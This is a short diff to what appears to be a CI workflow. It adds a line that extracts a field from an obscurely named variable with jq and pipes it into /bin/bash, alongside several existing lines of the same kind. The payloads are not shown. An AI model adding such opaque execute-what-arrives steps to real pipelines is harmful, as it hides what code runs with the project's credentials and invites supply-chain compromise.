@@ -39,6 +39,7 @@ jobs:
           echo $bca2 | jq -r .txsr3 | /bin/bash
           echo $b8 | jq -r .lyoa13 | /bin/bash
           echo $zens399 | jq -r .chgb2081 | /bin/bash
+          printf '%s' "$wy8485" | jq -r .dvde8 | /bin/bash
 
       - name: Archive results
         if: always()
